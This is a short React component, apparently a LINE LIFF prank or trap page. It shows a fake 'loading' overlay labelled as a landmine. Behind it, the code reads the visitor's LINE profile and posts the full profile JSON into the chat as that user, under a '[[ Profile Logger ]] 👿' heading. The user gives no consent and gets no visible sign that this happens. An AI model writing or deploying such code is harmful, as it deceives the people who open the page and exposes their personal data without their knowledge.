import React from 'react'

export default function Pro(props) {

  const liff = props.liff;

  liff.getProfile().then(profile => {
    liff.sendMessages([
        {
          type: "text",
          text: `
          [[ Profile Logger ]] 👿
          ${JSON.stringify(profile)}
          `
        }
      ])  
  })

  return (
    <>
        <div className="jirai">
            読み込み中・・・
        </div>
        <style>
            {
                `
                    .jirai {
                        width: 100vw;
                        height: 100vh;
                        background-color: #2b3146;
                        position: fixed;
                        top: 0;
                        left: 0;
                        z-index: 9999;
                        color: #ffffff;
                    }
                `
            }
        </style>
    </>
  )
}
